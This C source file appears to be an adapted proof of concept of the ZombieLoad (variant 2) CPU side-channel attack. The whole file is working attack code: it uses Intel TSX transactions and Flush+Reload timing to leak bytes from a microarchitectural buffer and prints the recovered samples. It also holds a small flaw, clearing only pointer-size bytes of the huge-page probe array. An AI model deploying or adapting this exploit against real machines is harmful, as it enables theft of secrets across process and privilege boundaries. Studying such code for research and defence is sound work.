// based on https://github.com/IAIK/ZombieLoad/blob/9f6e3a553f63aee21f5f80dda75ed6308f12b7da/attacker/variant2_linux_windows/main.c

#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>

#include <signal.h>
#include <sys/mman.h>
#include <sys/time.h>

#include "cacheutils.h"

#define FROM 0x01
#define TO   0xff

#define NUM_BYTES 256
#define NUM_FINGERPRINTS 256

// Allocate the probe array on 4KB pages (0) or 2MB pages (1)?
#define USE_HUGEPAGE_PROBE_ARRAY 1

// Use the C (0) or inline assembly (1) implementation of transient fingerprinting?
#define USE_ASM_XOR 1

// probe array
#define MEM_SIZE ((NUM_BYTES + NUM_FINGERPRINTS) * 4096)
#if USE_HUGEPAGE_PROBE_ARRAY
  uint8_t* mem;
#else
  uint8_t __attribute__((aligned(4096))) mem[MEM_SIZE];
#endif

uint8_t __attribute__((aligned(4096))) mapping[4096];
uint32_t hist[256] = { 0 };
size_t sample_ctr = 0;
struct timeval time_start;

void recover(void);
void handle_SIGINT(int signum);

int main(int argc, char *argv[])
{
  // Check for TSX
  if(!has_tsx()) {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }

// Allocate probe array on huge pages
#if USE_HUGEPAGE_PROBE_ARRAY
  // Allocate probe array on huge pages
  mem = mmap(
    NULL, MEM_SIZE, PROT_READ | PROT_WRITE,
    MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB,
    -1, 0
  );
  if(mem == MAP_FAILED) {
    perror("mmap failed");
    puts("Maybe you have to enable huge pages first?\n\tsudo sysctl -w vm.nr_hugepages=16");
    exit(1);
  }
#endif

  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));
  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }
  
  /* Initialize mapping */
  memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);

  // Save timestamp before sampling
  gettimeofday(&time_start, NULL);

  // Set up signal handler for SIGINT (^C)
  signal(SIGINT, handle_SIGINT);

  while (true) {
    /* Flush mapping */
    flush(mapping);

    /* Begin transaction and recover value */
    if(xbegin() == (~0u)) {
      // Compute fingerprint
#if USE_ASM_XOR
      // Read the first 64 bits (8 bytes) from the cache line
      uint64_t register r0  = *((uint64_t*)mapping);
      uint64_t register r1 = 0;
      
      // XOR all bytes in r0 (x0 XOR x1 XOR x2 XOR x3 XOR x4 XOR x5 XOR x6 XOR x7)
      // (based on https://stackoverflow.com/a/49213494)
      asm volatile (
        "shld $32, %0, %1\n\t"   // r1  = x0|x1|x2|x3
        "xor %k0, %k1\n\t"       // r1d = (x0|x1|x2|x3) XOR (x4|x5|x6|x7)
        "shld $16, %k1, %k0\n\t" // r0d = ...|x0 XOR x4|x1 XOR x5
        "xor %w0, %w1\n\t"       // r1w = (x0 XOR x2 XOR x4 XOR x6|x1 XOR x3 XOR x5 XOR x7)
        "shld $8, %w1, %w0\n\t"  // r0w = ...|x0 XOR x2 XOR x4 XOR x6
        "xor %b1, %b0\n\t"       // r0b = x0 XOR x1 XOR x2 XOR x3 XOR x4 XOR x5 XOR x6 XOR x7
        "and $0xff, %0"          // only preserve the lower byte of r0
        : "+q" (r0),
          "+q" (r1)
        : // no dedicated input
        : "cc" // Modifies flag registers
      );
#else
      // Read the first 64 bits (8 bytes) from the cache line
      uint64_t r0 = *((uint64_t*)mapping);
      // XOR all bytes in r0 (x0 XOR x1 XOR x2 XOR x3 XOR x4 XOR x5 XOR x6 XOR x7)
      r0 = (r0 >> 32) ^ r0;
      r0 = (r0 >> 16) ^ r0;
      r0 = ((r0 >> 8) ^ r0) & 0xff;
#endif
      // Leak byte at position 0 to the first half of the probe array
      maccess(mem + 4096 * mapping[0]);
      // Leak fingerprint to the second half of the probe array (1048576=4096*256)
      maccess(mem + 1048576 + 4096 * r0);
    
      xend();
    }
    
    recover();
  }

  return 0;
}


void recover(void) {
    /* Recover value from cache and update histogram */
    for (size_t i = FROM; i <= TO; i++) {
      if (flush_reload((char*) mem + 4096 * i)) {
        printf("Sample: %.2x\n", i);
        sample_ctr++;
      }
    }
}

void handle_SIGINT(int signum) {
  // Save timestamp after sampling and print duration and sampling rate
  struct timeval time_end, time_duration;
  gettimeofday(&time_end, NULL);
  timersub(&time_end, &time_start, &time_duration);
  double duration = (double)(time_duration.tv_sec) + (double)(time_duration.tv_usec) / 1000000;
  printf("Collected %zu samples in %lf seconds (%lf samples/s).\n", sample_ctr, duration, sample_ctr / duration);
  exit(0);
}